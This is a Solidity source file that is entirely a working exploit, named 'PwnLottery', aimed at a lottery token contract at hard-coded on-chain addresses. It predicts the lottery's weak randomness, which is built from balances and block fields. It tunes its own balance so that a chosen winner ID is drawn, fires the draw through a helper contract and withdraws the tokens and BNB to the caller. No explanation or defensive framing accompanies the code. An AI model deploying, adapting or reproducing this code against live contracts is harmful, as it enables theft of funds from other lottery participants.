// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.6.12;

interface ILottery {
    function topUserId() external view returns (uint256);
    function triggerLottery() external;
    function userTickets(address user) external view returns (uint256);
    function lotteryDifficulty() external view returns (uint256);
    function idAddress(uint32 id) external view returns (address);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external;
    function balanceOf(address account) external returns (uint256);
}

contract Caller {
    constructor() public {

    }

    function useCall() public {
        ILottery(0x73b01a9C8379a9D3009F2351f22583F8B75CC1bA).triggerLottery();
    }

    function withdraw() public {
        IERC20 token = IERC20(0x73b01a9C8379a9D3009F2351f22583F8B75CC1bA);
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }
}

contract PwnLottery {
    address constant WINNER = 0x92010D29227Ebe9A7625AC398310A7bB3030EcBE;
    uint256 constant WINNER_ID = 732;
    address constant TOKEN = 0x73b01a9C8379a9D3009F2351f22583F8B75CC1bA;
    uint256 constant CALLER_NB = 10;
    address payable owner;
    Caller caller;
    ILottery lottery = ILottery(0x73b01a9C8379a9D3009F2351f22583F8B75CC1bA);

    event I(uint256 id, address addr, bool valid, uint256 prevBalance, uint256 newBalance);

    constructor() public payable {
        caller = new Caller();

        owner = msg.sender;
    }

    function withdraw() public {
        IERC20 token = IERC20(TOKEN);
        msg.sender.transfer(address(this).balance);
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }

    receive() external payable {
    }

    function tryPwnLottery(uint256 _maxLoop, bool run) public {
        if (run)
            caller.useCall();

        uint256 balance = address(this).balance;
        uint256 fixedBalance = balance;
        uint256 userTopId = lottery.topUserId();
        uint256 loop = 0;

        while (getRandomNumber(fixedBalance, userTopId) != WINNER_ID || !didUserWin(fixedBalance)) {
            fixedBalance--;
            loop++;

            require(loop < _maxLoop);
        }

        uint32 id = uint32(getRandomNumber(fixedBalance, userTopId));
        bool valid = didUserWin(fixedBalance);

        if (run) {
            uint256 toTransfer = balance - fixedBalance;

            msg.sender.transfer(toTransfer);

            lottery.triggerLottery();

            withdraw();
            caller.withdraw();
        }

        emit I(id, lottery.idAddress(id), valid, balance, address(this).balance);
    }

    function testPwnLottery(uint256 _maxLoop) public view returns (uint32, address, bool) {
        uint256 balance = address(this).balance;
        uint256 fixedBalance = balance;
        uint256 userTopId = lottery.topUserId();
        uint256 loop = 0;

        while (getRandomNumber(fixedBalance, userTopId) != WINNER_ID || !didUserWin(fixedBalance)) {
            fixedBalance--;
            loop++;

            require(loop < _maxLoop);
        }

        uint32 id = uint32(getRandomNumber(fixedBalance, userTopId));
        bool valid = didUserWin(fixedBalance);

        return (id, lottery.idAddress(id), valid);
    }

    function didUserWin(uint256 balance) internal view returns (bool) {
        // if (_isExcludedFromLottery[idAddress[winningId]]) {
        //     return false;
        // }
        uint256 topUserId = lottery.topUserId();
        uint256 userTickets = lottery.userTickets(WINNER);
        uint256 difficulty = lottery.lotteryDifficulty();

        if (userTickets >= uint32(difficulty) / topUserId) {
            return true;
        }
        uint256 randomResult = getRandomNumber(balance, uint32(difficulty) / topUserId);
        if (randomResult <= userTickets) {
            return true;
        } else {
            return false;
        }
    }

    function getRandomNumber(uint256 callerBNBBalance, uint256 upperNumber) internal view returns (uint256) {
        uint256 wrappedBNBBalance = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balance;
        uint256 shuffler;

        uint256 randomResult = uint256(keccak256(abi.encodePacked(
                callerBNBBalance + wrappedBNBBalance + block.timestamp + block.difficulty +
                block.gaslimit + shuffler))) % upperNumber;
        return randomResult+1;
    }
}
